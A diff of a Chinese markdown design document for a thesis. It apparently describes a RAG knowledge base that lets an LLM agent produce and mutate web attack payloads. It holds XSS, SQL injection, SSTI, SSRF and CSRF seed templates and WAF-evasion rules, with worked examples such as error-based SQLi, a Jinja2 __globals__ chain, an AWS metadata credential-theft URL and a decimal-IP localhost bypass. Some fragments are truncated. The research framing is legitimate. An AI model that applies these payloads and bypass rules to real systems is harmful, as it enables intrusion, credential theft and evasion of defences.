 #### 3. JavaScript 环境类 (JS Context Seeds)
-*适用于输入点位于 `<script>` 标签内部。*
+适用于输入点位于 `<script>` 标签内部。
 
 | ID | 结构标签 (Context) | 语法模板 (Template) | 适用场景说明 |
 | :--- | :--- | :--- | :--- |
@@ -778,7 +769,7 @@ XSS 的结构变化极多，我们将种子分为四大类：
 | SEED-XSS-070 | No Paren | `onerror={payload_js};throw 1` | 无括号执行 |
 
 #### 4. 伪协议与特殊环境类 (Protocol & Special)
-*适用于 URL 参数、框架特性等特殊位置。*
+适用于 URL 参数、框架特性等特殊位置。
 
 | ID | 结构标签 (Context) | 语法模板 (Template) | 适用场景说明 |
 | :--- | :--- | :--- | :--- |
@@ -805,7 +796,7 @@ XSS 的结构变化极多，我们将种子分为四大类：
 
 #### 5. 变种扩展逻辑 (Mutation Logic for Expansion)
 
-为了将上述 ~90 条基础种子扩充至 500+，数据库构建脚本将应用以下**变异规则（Mutation Rules）**：
+为了将上述 ~90 条基础种子扩充至 500+，数据库构建脚本将应用以下变异规则（Mutation Rules）：
 
 1.  **Tag Permutation (标签排列)**:
     *   将 `{tag}` 占位符替换为：`img`, `svg`, `body`, `iframe`, `details`, `audio`, `video`, `input`, `textarea`, `keygen`, `select`, `isindex` (old), `math` (xml).
@@ -833,22 +824,22 @@ XSS 的结构变化极多，我们将种子分为四大类：
 
 ---
 
-### 使用方法
+#### 使用方法
 当 LLM（智能体）需要生成 Payload 时：
 1.  **检索（RAG）**：根据探测到的环境（例如：“这是一个 `<input>` 标签，属性是 `value`，过滤了双引号”），在**高质量样本库**中找到相似案例。
 2.  **选择种子**：LLM 决定使用“单引号闭合 + 属性注入”策略，从**本种子库**中提取 ID 为 `SEED-XSS-034` 的模板：`'{event}='{payload_js}`。
 3.  **填充（Filling）**：LLM 将 `{event}` 填为 `onfocus`，`{payload_js}` 填为 `alert(1)`。
 4.  **生成**：得到最终 Payload `'onfocus='alert(1)`，保证了语法结构的正确性。
 
-**下一步：请确认是否继续生成“SQL注入”的结构化种子库？**
+
 ---
 
 ### 子库二：结构化 Payload 种子库 - SQLi 专项 (精选 100+ 核心骨架)
 
 
-好的，我们继续构建 **子库二：结构化 Payload 种子库** 的第二部分：**SQL注入（SQLi）专项**。
 
-SQL 注入的结构化种子旨在为 LLM 提供**“符合 SQL 语法规范”**的骨架。由于 SQL 注入非常依赖闭合方式（Quote）和注释符（Comment），种子库必须覆盖这些排列组合。
+
+SQL 注入的结构化种子旨在为 LLM 提供**“符合 SQL 语法规范”的骨架。由于 SQL 注入非常依赖闭合方式（Quote）和注释符（Comment），种子库必须覆盖这些排列组合。
 
 **变量定义（Prompt Template placeholders）：**
 *   `{payload}`: 具体的攻击载荷（如 `user()`, `@@version`, `(SELECT...)`）。
@@ -860,7 +851,7 @@ SQL 注入的结构化种子旨在为 LLM 提供**“符合 SQL 语法规范”*
 *   `{table}`: 表名。
 *   `{col}`: 列名。
 
-*(注：实际库中通过脚本对闭合符、注释符和数据库方言进行排列组合，可扩展至 500+ 条)*
+(注：实际库中通过脚本对闭合符、注释符和数据库方言进行排列组合，可扩展至 500+ 条)
 
 #### 1. 逻辑与布尔盲注类 (Boolean & Logic Seeds)
 *适用于 WHERE 子句后的逻辑判断注入。*
@@ -984,7 +975,7 @@ SQL 注入的结构化种子旨在为 LLM 提供**“符合 SQL 语法规范”*
 
 ---
 
-### 使用方法
+#### 使用方法
 
 1.  **探测阶段**：智能体首先探测注入点类型（如：MySQL, 单引号闭合）。
 2.  **RAG 检索**：智能体决定使用“报错注入提取版本号”。
@@ -995,11 +986,11 @@ SQL 注入的结构化种子旨在为 LLM 提供**“符合 SQL 语法规范”*
     *   `{comment}` -> `#`
 5.  **最终 Payload**：`' AND EXTRACTVALUE(1, CONCAT(0x7e, (@@version), 0x7e)) #`
 
-**下一步：请确认是否继续生成“SSTI”的结构化种子库？**
+
 ---
 
 ### 子库二：结构化 Payload 种子库 - SSTI 专项 (精选 80+ 核心骨架)
-好的，我们继续构建 **子库二：结构化 Payload 种子库** 的第三部分：**服务器端模板注入（SSTI）专项**。
+
 
 SSTI 的种子库构建重点在于**特定模板引擎的语法结构**。LLM 需要根据探测到的引擎类型（如 Jinja2 或 FreeMarker），从库中提取对应的对象调用链骨架，并填入具体的执行命令。
 
@@ -1106,7 +1097,7 @@ SSTI 的种子库构建重点在于**特定模板引擎的语法结构**。LLM �
 
 ---
 
-### 使用方法
+#### 使用方法
 
 1.  **指纹识别**：智能体通过发送 `{{7*7}}` 收到 `49`，确认为 Jinja2/Twig 类引擎。
 2.  **上下文判断**：通过发送 `{{config}}` 成功，确认为 Python Jinja2。
@@ -1121,9 +1112,9 @@ SSTI 的种子库构建重点在于**特定模板引擎的语法结构**。LLM �
 ---
 
 ### 子库二：结构化 Payload 种子库 - SSRF 专项 (精选 80+ 核心骨架)
-好的，我们继续构建 **子库二：结构化 Payload 种子库** 的第四部分：**服务器端请求伪造（SSRF）专项**。
 
-SSRF 的种子库构建重点在于**协议头（Scheme）的利用**、**IP/域名的伪装**以及**针对特定云服务商的固定格式**。LLM 需根据探测到的后端环境（如是否支持 cURL、是否为 AWS 环境），从库中提取 URL 骨架并填充目标地址。
+
+SSRF 的种子库构建重点在于协议头（Scheme）的利用、IP/域名的伪装以及针对特定云服务商的固定格式。LLM 需根据探测到的后端环境（如是否支持 cURL、是否为 AWS 环境），从库中提取 URL 骨架并填充目标地址。
 
 **变量定义（Prompt Template placeholders）：**
 *   `{proto}`: 协议名称（如 `http`, `https`, `file`, `gopher`）。
@@ -1245,7 +1236,7 @@ SSRF 的种子库构建重点在于**协议头（Scheme）的利用**、**IP/域
 
 ---
 
-### 使用方法
+#### 使用方法
 
 1.  **环境感知**：智能体探测到参数名为 `webhook` 且服务器响应头包含 `Amazon` 字样。
 2.  **RAG 检索**：检索到 AWS 元数据窃取场景 (SSRF-001)。
@@ -1254,12 +1245,12 @@ SSRF 的种子库构建重点在于**协议头（Scheme）的利用**、**IP/域
     *   `{path}` -> `latest/meta-data/iam/security-credentials/`
 5.  **最终 Payload**：`http://169.254.169.254/latest/meta-data/iam/security-credentials/`
 
-**下一步：请确认是否继续生成最后一个核心子库——“CSRF”的结构化种子库？**
+
 
 ---
 
 ### 子库二：结构化 Payload 种子库 - CSRF 专项 (精选 50+ 核心骨架)
-好的，我们构建 **子库二：结构化 Payload 种子库** 的第五部分，也是最后一部分：**跨站请求伪造（CSRF）专项**。
+
 
 CSRF 的种子库构建核心在于**HTML 标签与表单的构造**。与前几种漏洞不同，CSRF 的 Payload 通常是一个完整的 HTML 页面片段（PoC），旨在诱导浏览器发起请求。LLM 需要根据探测到的接口请求方式（GET/POST）和参数格式（Form/JSON），生成能够自动提交或诱导点击的 HTML 代码。
 
@@ -1361,7 +1352,7 @@ CSRF 的种子库构建核心在于**HTML 标签与表单的构造**。与前几
 
 ---
 
-### 使用方法与 RAG 流程总结
+#### 使用方法与 RAG 流程总结
 
 随着 CSRF 种子库的完成，我们已经构建了一套完整的 **"RAG 知识库体系"**。
 
@@ -1388,21 +1379,13 @@ CSRF 的种子库构建核心在于**HTML 标签与表单的构造**。与前几
 
 ---
 
-### 下一步建议
 
-您现在已经拥有了：
-1.  **高质量攻击样本库** (用于 Few-Shot Learning, 提供思路)
-2.  **结构化 Payload 种子库** (用于 Skeleton Generation, 保证语法)
-3.  **绕过规则库** (用于 Feedback Loop, 处理拦截) - *注：此前在您的原始需求描述中已有示例，如需扩充也可继续。*
 
-**建议：**
-可以将这些库的**构建逻辑**、**数据结构**以及**向量化方法 (Qwen3-Embedding + Milvus)** 整理到您的论文第 3 章节（研究方法）中。这些具体的表结构和分类逻辑将极大地增强论文的实证性和技术深度。
 ---
 
 ### 子库三：绕过规则库 - XSS 专项 (精选 100+ 条核心规则)
 
 
-好的，我们开始构建 **子库三：绕过规则库（Bypass Rules Library）**。
 
 这个库在 RAG 闭环中起着**“纠错”**和**“进化”**的关键作用。当智能体的攻击被 WAF 拦截（例如返回 403 Forbidden，或提示 "Malicious Input Detected"）时，系统会提取拦截特征（如 "script tag blocked"），并在本库中检索对应的变异策略，指导 CoT 修改 Payload。
 
@@ -1537,7 +1520,7 @@ CSRF 的种子库构建核心在于**HTML 标签与表单的构造**。与前几
 
 ---
 
-### 使用逻辑示例 (RAG Reasoning)
+#### 使用逻辑示例 (RAG Reasoning)
 
 1.  **探测**: 智能体发送 `<script>alert(1)</script>`。
 2.  **反馈**: WAF 返回拦截信息，提示 "Pattern match: script tag"。
@@ -1547,12 +1530,11 @@ CSRF 的种子库构建核心在于**HTML 标签与表单的构造**。与前几
 6.  **反馈**: 如果再次拦截 "onload blocked"，则检索 "onload blocked"。
 7.  **变异**: 召回 `BP-XSS-022` (Event Swap)，生成 `<svg/onanimationstart=alert(1)>`。
 
-**接下来，请确认是否继续生成“SQL
----
+
 
 ### 子库三：绕过规则库 - SSTI 专项 (精选 70+ 条核心规则)
 
-好的，我们继续构建 **子库三：绕过规则库（Bypass Rules Library）** 的第二部分：**SQL注入（SQLi）专项**。
+
 
 SQL 注入的防御（WAF）通常基于正则匹配（Regex Matching）或语义分析（Semantic Analysis）。绕过策略的核心在于**破坏 WAF 的解析逻辑，但保持数据库（DB）的解析逻辑不变**。
 
@@ -1561,12 +1543,10 @@ SQL 注入的防御（WAF）通常基于正则匹配（Regex Matching）或语�
 1.  **空白符绕过 (Whitespace Evasion)**：针对空格 ` ` 被拦截的情况。
 2.  **注释符绕过 (Comment Evasion)**：针对 `--`、`#` 等注释符被拦截的情况。
 3.  **关键字绕过 (Keyword Evasion)**：针对 `UNION`、`SELECT`、`FROM` 等核心词被拦截的情况。
-4.  **运算符与逻辑绕过 (Operator & Logic)**：针对 `AND`、`OR`、`=` 等符号被拦截的情况。
+4.  **运算符与逻辑绕过 (Operator & Logic)**：
 5.  **函数与编码绕过 (Function & Encoding)**：针对 `SLEEP()`、`USER()` 及字符编码的利用。
 6.  **高级混淆技术 (Advanced Obfuscation)**：HTTP 参数污染、缓冲区溢出等。
 
-
-好的，我们继续构建 **子库三：绕过规则库（Bypass Rules Library）** 的第三部分：**服务器端模板注入（SSTI）专项**。
 
 SSTI 的防御通常基于对**特殊字符**（如 `{{`, `}}`, `.`, `_`, `[`）和**敏感关键词**（如 `class`, `mro`, `popen`, `eval`）的检测。绕过策略的核心在于利用**模板引擎的内置过滤器、编码机制和动态属性访问**特性。
 
@@ -1684,11 +1664,9 @@ SSTI 的防御通常基于对**特殊字符**（如 `{{`, `}}`, `.`, `_`, `[`）
 9.  **变异**: 检索 "globals blocked"，召回 `BP-SSTI-015` (Attr 过滤器)。
 10. **最终 Payload**: `{{ self|attr('__init__')|attr('__globals__') }}`。
 
-**接下来，请确认是否继续生成“SSRF”的绕过规则库？**
----
 
 ### 子库三：绕过规则库 - SSRF 专项 (精选 70+ 条核心规则)
-好的，我们继续构建 **子库三：绕过规则库（Bypass Rules Library）** 的第四部分：**服务器端请求伪造（SSRF）专项**。
+
 
 SSRF 的防御机制主要集中在**IP 地址解析（黑名单）**、**域名白名单**以及**协议头检查**。绕过策略的核心在于利用**URL 解析器之间的差异**（如 cURL vs. urllib vs. Java URI）以及**各种进制编码**来欺骗 WAF，使其认为目标是合法地址，但后端实际请求的却是内网地址。
 
@@ -1789,7 +1767,7 @@ SSRF 的防御机制主要集中在**IP 地址解析（黑名单）**、**域名
 
 ---
 
-### 使用逻辑示例 (RAG Reasoning for SSRF)
+#### 使用逻辑示例 (RAG Reasoning for SSRF)
 
 1.  **探测**: 智能体发送 `http://127.0.0.1/admin`。
 2.  **反馈**: WAF 返回 "Blocked: Localhost access denied"。
@@ -1798,9 +1776,6 @@ SSRF 的防御机制主要集中在**IP 地址解析（黑名单）**、**域名
 5.  **变异**: 智能体选择 `BP-SSRF-001`，计算 `127.0.0.1` -> `2130706433`。
 6.  **最终 Payload**: `http://2130706433/admin`。
 
-**至此，我们已经完成了 XSS, SQLi, SSTI, SSRF 四大漏洞的“绕过规则库”构建。CSRF 的绕过规则（如 Referer 绕过）已包含在之前的 CSRF 样本库中。**
-
-**所有知识库（共计三个子库，5类漏洞）的内容生成工作已全部完成。** 您可以将这些表格数据导出并向量化，作为您论文中“知识库构建”部分的坚实基础。
 
 ---
 
@@ -1892,8 +1867,4 @@ SSRF 的防御机制主要集中在**IP 地址解析（黑名单）**、**域名
     *   **作用**：作为“反馈闭环”的指导手册。当攻击失败时，根据拦截特征（如 "Space Blocked"）检索对应的变异策略。
     *   **规模**：涵盖空格/注释/关键字绕过、编码混淆、逻辑替换等，共计 **350+** 条对抗规则。
 
-**数据落地建议：**
-在论文中，您可以截取上述表格的**部分示例**（例如每个子库展示 5-10 条典型数据）放入表 3、表 4、表 5 中，并说明完整数据集已通过 Python 脚本自动化构建并存入向量数据库。
-
-**所有知识库内容生成完毕。** 您现在可以继续撰写论文的其他部分，或者对现有内容进行微调。
 
